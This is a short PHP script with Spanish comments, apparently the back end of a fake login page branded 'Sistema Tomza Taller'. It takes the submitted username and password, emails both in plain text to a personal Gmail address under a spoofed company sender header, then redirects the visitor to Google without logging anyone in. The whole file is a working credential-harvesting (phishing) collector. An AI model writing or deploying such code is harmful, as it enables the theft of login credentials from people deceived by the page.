<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos del formulario
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Validar campos
if ($usuario === "" || $password === "") {
    die("Por favor completa todos los campos.");
}

// --------------------------
// Envío seguro SIN librerías
// --------------------------
$tu_correo = "sebastiancq2008@gmail.com";
$asunto = "Nuevo ingreso - Sistema Tomza Taller";
$mensaje = "Datos de acceso recibidos:\n\n";
$mensaje .= "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";

// Encabezados completos para que no lo rechacen
$encabezados = "From: Sistema Tomza <no-reply@tomzataller.com>\r\n";
$encabezados .= "Reply-To: " . $tu_correo . "\r\n";
$encabezados .= "MIME-Version: 1.0\r\n";
$encabezados .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Intentar enviar
@mail($tu_correo, $asunto, $mensaje, $encabezados);

// Redirigir a Google como querés
header("Location: https://www.google.com");
exit;
?>
